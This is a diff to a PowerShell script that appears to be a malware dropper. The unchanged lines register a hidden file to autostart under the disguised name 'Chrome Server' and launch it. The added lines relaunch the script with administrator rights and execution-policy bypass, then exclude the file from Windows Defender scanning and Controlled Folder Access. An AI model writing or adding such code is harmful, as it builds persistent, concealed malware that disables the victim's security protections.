@@ -88,4 +88,9 @@ if (Test-Path -Path $file_path) {
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Chrome Server' -Value $file_path
     Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
     Invoke-Item -Path $file_path
+    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+      Start-Process powershell -Verb runAs -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"")
+    }
+    Add-MpPreference -ExclusionPath $file_path
+    Add-MpPreference -ControlledFolderAccessAllowedApplications $file_path
 }
